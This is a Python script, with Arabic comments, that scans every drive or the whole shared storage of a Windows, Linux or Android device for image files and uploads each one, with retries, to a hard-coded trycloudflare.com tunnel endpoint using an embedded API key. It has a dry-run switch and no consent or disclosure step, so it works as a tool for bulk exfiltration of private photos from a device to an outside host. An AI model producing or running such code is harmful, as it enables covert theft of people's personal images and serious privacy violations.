import os
import sys
import time
import string
import logging
from pathlib import Path
import requests
from requests.exceptions import (
    ConnectionError, Timeout, HTTPError, RequestException, JSONDecodeError
)

# ==========================================================
# إعدادات المستخدم
# ==========================================================
SERVER_URL = "https://installing-his-controversial-papua.trycloudflare.com/upload"
API_KEY = "_r0y7ZcKdiGvg47w3heYMen8Mb9PtZBq5z_cO6SujCo"

# صيغ الصور المدعومة
IMAGE_EXTENSIONS = {
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp",
    ".tiff", ".svg", ".heic", ".heif", ".raw", ".cr2", ".nef"
}

# جذور البحث (سيتم ملؤها تلقائيًا حسب النظام)
ROOTS = []

# مجلدات يتم تجاهلها لتجنب النظام والملفات المؤقتة
EXCLUDE_DIR_NAMES = {
    "Windows", "Program Files", "Program Files (x86)", "ProgramData",
    "$Recycle.Bin", "System Volume Information", "AppData",
    "node_modules", ".git", "__pycache__", ".venv", "venv",
    "proc", "sys", "dev", "run", "boot", "lost+found",
    "Android/data", "Android/obb", ".thumbnails", ".cache",
    "Temp", "tmp", "Cache", "cache"
}

# تجاهل المجلدات المخفية (التي تبدأ بنقطة) - اجعلها False إذا أردت تضمينها
SKIP_HIDDEN = False

# الحد الأقصى لحجم الملف بالميجابايت (0 = بلا حد)
MAX_FILE_SIZE_MB = 100

# إعدادات الشبكة
CONNECT_TIMEOUT = 10
READ_TIMEOUT = 60
MAX_RETRIES = 3
RETRY_BACKOFF = 2

# وضع التجربة: True = يعرض الملفات فقط دون رفع
DRY_RUN = True   # ⚠️ اجعلها False بعد التجربة

# ==========================================================
# إعداد السجلات
# ==========================================================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("upload_errors.log", encoding="utf-8")
    ]
)
logger = logging.getLogger(__name__)


def detect_roots():
    """تحديد جذور البحث حسب نظام التشغيل."""
    roots = []
    if sys.platform.startswith("win"):
        # جميع أقراص Windows
        for letter in string.ascii_uppercase:
            drive = Path(f"{letter}:\\")
            if drive.exists():
                roots.append(drive)
    elif "android" in sys.platform.lower() or "linux" in sys.platform.lower():
        # في Termux: الذاكرة المشتركة
        shared = Path("/storage/emulated/0")
        if shared.exists():
            roots.append(shared)
        else:
            # على لينكس عادي: الجذر (مع استثناءات)
            roots.append(Path("/"))
    else:
        roots.append(Path("/"))
    return roots


def is_excluded(dir_path: Path) -> bool:
    """التحقق مما إذا كان المجلد يجب استثناؤه."""
    parts = set(dir_path.parts)
    if parts & EXCLUDE_DIR_NAMES:
        return True
    if SKIP_HIDDEN and any(p.startswith(".") for p in dir_path.parts if p not in ("/", "\\")):
        return True
    return False


def upload_image(file_path: Path) -> requests.Response:
    """رفع صورة واحدة مع تسجيل تفصيلي."""
    headers = {}
    if API_KEY:
        headers["Authorization"] = f"Bearer {API_KEY}"

    size_mb = file_path.stat().st_size / (1024 * 1024)
    logger.info(f"Uploading: {file_path} ({size_mb:.2f} MB)")

    with open(file_path, "rb") as f:
        files = {"file": (file_path.name, f, "application/octet-stream")}
        try:
            response = requests.post(
                SERVER_URL,
                files=files,
                headers=headers,
                timeout=(CONNECT_TIMEOUT, READ_TIMEOUT)
            )
            response.raise_for_status()
            return response
        except Timeout as e:
            logger.error(f"Timeout uploading {file_path}: {e}")
            raise
        except ConnectionError as e:
            logger.error(f"Connection error uploading {file_path}: {e}")
            raise
        except HTTPError as e:
            logger.error(f"HTTP {response.status_code} for {file_path}: {e}")
            try:
                logger.error(f"Server response: {response.json()}")
            except JSONDecodeError:
                logger.error(f"Server body: {response.text[:200]}")
            raise
        except RequestException as e:
            logger.error(f"Request error for {file_path}: {e}")
            raise


def upload_with_retry(file_path: Path) -> requests.Response:
    """إعادة المحاولة عند فشل الشبكة."""
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            return upload_image(file_path)
        except (Timeout, ConnectionError):
            if attempt == MAX_RETRIES:
                raise
            wait = RETRY_BACKOFF * (2 ** (attempt - 1))
            logger.warning(f"Attempt {attempt} failed. Retrying in {wait}s...")
            time.sleep(wait)


def scan_and_upload():
    """البحث في كل الجذور ورفع الصور."""
    global ROOTS
    if not ROOTS:
        ROOTS = detect_roots()

    logger.info(f"Roots to scan: {[str(r) for r in ROOTS]}")
    logger.info(f"DRY_RUN = {DRY_RUN}")

    total_files = 0
    success = 0
    failed = 0
    skipped = 0

    for root in ROOTS:
        if not root.exists():
            logger.warning(f"Root does not exist: {root}")
            continue

        logger.info(f"Scanning: {root}")
        for dirpath, dirnames, filenames in os.walk(root, topdown=True, onerror=lambda e: logger.debug(f"Walk error: {e}")):
            current_dir = Path(dirpath)

            # تعديل القائمة لتجاهل المجلدات المستثناة
            dirnames[:] = [
                d for d in dirnames
                if not is_excluded(current_dir / d)
            ]

            for filename in filenames:
                file_path = current_dir / filename
                ext = file_path.suffix.lower()
                if ext not in IMAGE_EXTENSIONS:
                    continue

                total_files += 1

                # التحقق من الحجم
                try:
                    size_mb = file_path.stat().st_size / (1024 * 1024)
                except OSError:
                    skipped += 1
                    continue

                if MAX_FILE_SIZE_MB > 0 and size_mb > MAX_FILE_SIZE_MB:
                    logger.info(f"Skipping large file: {file_path} ({size_mb:.2f} MB)")
                    skipped += 1
                    continue

                if DRY_RUN:
                    logger.info(f"[DRY RUN] Would upload: {file_path}")
                    success += 1
                    continue

                try:
                    resp = upload_with_retry(file_path)
                    logger.info(f"SUCCESS: {file_path} (HTTP {resp.status_code})")
                    success += 1
                except Exception as e:
                    logger.error(f"FAILED: {file_path} - {e}")
                    failed += 1

    logger.info("=" * 50)
    logger.info(f"Scan complete. Found images: {total_files}")
    logger.info(f"Success: {success}, Failed: {failed}, Skipped: {skipped}")
    if DRY_RUN:
        logger.info("This was a DRY RUN. Set DRY_RUN = False to actually upload.")


if __name__ == "__main__":
    scan_and_upload()
